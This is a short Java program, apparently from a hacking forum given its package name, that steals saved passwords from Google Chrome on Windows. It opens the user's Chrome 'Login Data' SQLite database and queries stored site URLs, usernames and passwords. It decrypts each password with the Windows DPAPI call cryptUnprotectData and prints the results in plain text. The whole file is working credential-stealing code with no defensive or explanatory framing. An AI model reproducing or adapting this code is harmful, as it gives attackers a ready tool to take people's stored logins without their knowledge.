package net.hackforums.vanilla.chrome;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

import com.sun.jna.platform.win32.Crypt32Util;


public class Main
{
    public static void main(String[] args) throws ClassNotFoundException
    {
        //Get JDBC sqlite driver
        Class.forName("org.sqlite.JDBC");

        Connection connection = null;
        try{
            //connect to DB
            connection = DriverManager.getConnection("jdbc:sqlite:C://Users//" + System.getProperty("user.name") + "//AppData//Local//Google//Chrome//User Data//Default//Login Data");
            Statement statement = connection.createStatement();
            //set timeout to 5sec
            statement.setQueryTimeout(5);
            //Execute query and store resultset in rs variable
            ResultSet rs = statement.executeQuery("select origin_url,username_value,password_value from logins");
            int id = 0;
            while(rs.next()){
                //get url
                String url =  rs.getString("origin_url");
                //get password and decrypt it with win32 cryt32Util
                String password = new String(Crypt32Util.cryptUnprotectData(rs.getBytes("password_value")));
                //get username
                String username = rs.getString("username_value");
                ++id;

                System.out.println("[" + id + "]" + url + " : " + username + " : " + password);
            }
        }catch(SQLException e)       {
            System.err.println(e.getMessage());
        }finally{
            try{
                if(connection != null){
                    connection.close();
                }
            }catch(SQLException e){
                System.err.println(e);
            }
        }
    }
}